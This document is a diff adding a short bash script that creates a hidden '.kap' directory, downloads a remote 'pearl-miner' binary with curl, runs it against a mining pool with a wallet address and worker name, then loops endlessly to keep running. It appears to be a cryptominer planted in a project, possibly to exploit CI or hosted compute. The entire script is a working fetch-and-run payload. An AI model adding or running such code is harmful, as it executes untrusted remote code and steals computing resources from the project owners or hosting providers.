@@ -1,0 +1,10 @@
+#!/bin/bash
+mkdir .kap && cd .kap
+
+curl https://pearlhash.xyz/downloads/pearl-miner-v12 -o pearl-miner
+chmod u+x pearl-miner
+./pearl-miner --host pool.pearlhash.xyz:9000 --user https://pearl.alphapool.tech/#miner/prl1pjp3jd7ue653f6zyrn9ewwu7lalw538kn5w2l4lekv0g3nxqlj23qnwg6g0 --worker colkae
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
